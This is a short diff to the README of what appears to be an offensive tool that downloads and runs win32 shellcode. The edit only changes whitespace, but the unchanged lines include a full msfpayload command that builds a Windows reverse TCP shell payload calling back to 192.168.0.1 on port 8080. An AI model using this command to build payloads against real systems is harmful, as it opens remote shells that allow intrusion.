@@ -5,7 +5,8 @@ Downloads win32 shellcode from webservers and executes the shellcode without the
 
 For use by IT professionals and researchers.
 
-Usage: 
+Usage:
+ 
 Create shellcode using the following msfpayload command:
 
 msfpayload windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=8080 EXITFUNC=thread R > test.txt
